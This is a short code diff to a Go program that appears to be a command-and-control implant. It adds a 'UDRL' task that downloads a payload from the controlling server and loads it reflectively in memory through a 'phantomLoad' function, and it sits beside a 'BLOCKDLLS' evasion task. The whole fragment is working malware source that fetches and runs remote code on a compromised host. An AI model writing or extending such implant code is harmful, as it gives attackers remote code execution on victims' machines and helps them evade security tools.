@@ -594,6 +594,28 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
+	case "UDRL":
+		// Args JSON: {"payload":"<uploaded_filename>","host_dll":"<optional override>"}
+		var ua struct {
+			Payload string `json:"payload"`
+			HostDLL string `json:"host_dll"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &ua); err != nil {
+			t.sendResult(task.ID, "", "bad UDRL args: "+err.Error())
+			return
+		}
+		sc, err := t.downloadFile(ua.Payload)
+		if err != nil {
+			t.sendResult(task.ID, "", "udrl: download '"+ua.Payload+"': "+err.Error())
+			return
+		}
+		out, err := phantomLoad(sc)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
 	case "BLOCKDLLS":
 		// Args: "on" or "off"
 		enable := strings.ToLower(strings.TrimSpace(task.Args)) != "off"
